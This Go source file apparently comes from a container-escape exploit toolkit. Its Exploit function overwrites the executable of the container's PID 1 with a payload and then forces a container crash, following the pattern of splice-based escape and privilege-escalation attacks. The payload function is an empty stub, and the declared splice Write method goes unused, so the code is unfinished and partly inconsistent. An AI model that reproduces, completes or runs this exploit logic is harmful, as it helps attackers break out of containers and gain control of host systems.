package splice

import (
	"errors"
	"fmt"
	"github.com/ctrsploit/ctrsploit/helper/crash"
	"github.com/ctrsploit/ctrsploit/util"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"io/ioutil"
	"os"
)

type Splice interface {
	GetExpName() string
	Write(filepath string, offset int64, content []byte) (err error)
}

func escapeExpName(splice Splice) string {
	return fmt.Sprintf("%s-escape", splice.GetExpName())
}

func escalateExpName(splice Splice) string {
	return fmt.Sprintf("%s-permission-escalate", splice.GetExpName())
}

func Exploit(splice Splice) (err error) {
	err = writeImage(payload())
	if err != nil {
		return
	}
	err = makeCrash()
	if err != nil {
		return
	}
	return
}

func payload() []byte {
	return nil
}

func writeImage(payload []byte) (err error) {
	path, err := util.GetProcessPathByPid(1)
	if err != nil {
		if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
			awesome_error.CheckErr(err)
		}
		return
	}
	err = ioutil.WriteFile(path, payload, 0644)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func makeCrash() (err error) {
	return crash.MakeContainerCrash(crash.NewSig())
}
